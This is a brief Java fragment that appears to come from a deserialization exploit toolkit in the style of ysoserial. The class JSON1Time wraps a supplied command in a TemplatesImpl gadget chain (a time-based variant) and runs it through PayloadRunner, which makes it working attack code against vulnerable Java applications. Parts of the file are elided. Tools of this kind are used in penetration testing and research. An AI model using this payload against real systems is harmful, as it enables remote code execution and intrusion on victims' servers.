...
public class JSON1Time implements ObjectPayload<Object> {

    public Map getObject ( String command ) throws Exception {
        return makeCallerChain(Gadgets.createTemplatesImplTime(command), Templates.class);
    }
    ...
    public static void main ( final String[] args ) throws Exception {
        PayloadRunner.run(JSON1Time.class, args);
    }
